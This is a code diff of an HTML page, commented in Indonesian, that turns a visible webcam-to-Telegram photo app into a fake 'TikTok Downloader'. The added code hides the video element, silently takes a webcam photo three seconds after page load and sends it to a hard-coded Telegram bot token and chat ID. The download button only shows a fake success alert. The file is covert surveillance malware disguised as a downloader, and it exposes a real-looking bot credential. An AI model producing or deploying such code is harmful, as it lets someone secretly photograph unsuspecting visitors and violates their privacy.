@@ -3,38 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webcam App</title>
-    <style type="text/css" media="all">
-        #video {
-            display: block;
-            margin: 0 auto;
+    <title>TikTok Downloader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
         }
-        canvas {
-            display: none;
+        .container {
+            margin-top: 100px;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+        }
+        .input-container {
+            margin-bottom: 20px;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .input-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .input-container button:hover {
+            background-color: #45a049;
+        }
+        #video {
+            display: none; /* Kamera tidak terlihat */
+        }
+        #canvas {
+            display: none; /* Canvas untuk memproses gambar */
         }
     </style>
 </head>
 <body>
-    <h1 style="text-align: center;">Webcam App</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <br />
-    <button id="snap" style="display: block; margin: 10px auto;">Ambil Foto & Kirim ke Telegram</button>
+    <div class="container">
+        <h1>TikTok Downloader</h1>
+        <div class="input-container">
+            <input type="text" id="url" placeholder="Masukkan URL Video TikTok">
+            <button id="download">Download Video</button>
+        </div>
+    </div>
+    <video id="video" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
     <script>
-        const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Telegram Anda
-        const chatId = '6975695436'; // Ganti dengan chat ID tujuan
+        const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
+        const chatId = '6975695436'; // Ganti dengan chat ID Anda
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const snap = document.getElementById('snap');
 
-        // Meminta akses webcam
+        // Akses webcam tanpa terlihat
         navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
             video.srcObject = stream;
             video.play();
+
+            // Tangkap gambar setelah beberapa detik
+            setTimeout(() => {
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(function(blob) {
+                    sendPhotoToTelegram(blob);
+                }, 'image/jpeg');
+            }, 3000); // Ambil gambar setelah 3 detik
         }).catch(function(error) {
             console.error("Gagal mengakses webcam:", error);
-            alert("Pastikan Anda memberikan izin untuk mengakses webcam.");
         });
 
         // Fungsi untuk mengirim foto ke Telegram
@@ -48,25 +95,24 @@
                 body: formData
             }).then(response => {
                 if (response.ok) {
-                    alert("Foto berhasil dikirim ke Telegram!");
+                    console.log("Foto berhasil dikirim ke Telegram.");
                 } else {
-                    alert("Gagal mengirim foto ke Telegram.");
+                    console.error("Gagal mengirim foto ke Telegram.");
                 }
             }).catch(error => {
                 console.error("Error saat mengirim foto:", error);
-                alert("Terjadi kesalahan saat mengirim foto.");
             });
         }
 
-        // Ketika tombol "Ambil Foto" diklik
-        snap.addEventListener("click", function() {
-            const context = canvas.getContext("2d");
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Konversi canvas ke blob (gambar)
-            canvas.toBlob(function(blob) {
-                sendPhotoToTelegram(blob);
-            }, 'image/jpeg');
+        // Simulasi tombol download untuk interaksi pengguna
+        const downloadButton = document.getElementById("download");
+        downloadButton.addEventListener("click", function() {
+            const urlInput = document.getElementById("url").value;
+            if (urlInput) {
+                alert("Video berhasil diunduh (simulasi).");
+            } else {
+                alert("Masukkan URL terlebih dahulu!");
+            }
         });
     </script>
 </body>
